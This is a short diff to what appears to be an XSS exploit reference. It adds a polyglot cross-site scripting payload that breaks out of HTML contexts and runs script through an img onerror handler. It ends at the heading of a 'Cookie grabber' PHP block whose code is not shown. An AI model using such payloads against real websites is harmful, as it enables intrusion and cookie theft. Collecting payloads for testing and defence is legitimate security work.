@@ -6,6 +6,12 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 
 ## Exploit code or POC
 
+## Blind Injection Payload
+----------------------------
+
+/*-->]]>%>?></object></script></title></textarea></noscript></script></xmp>'-/"-alert(4567)//><img src=1 onerror=confirm(432)>
+
+
 Cookie grabber for XSS
 ```
 <?php
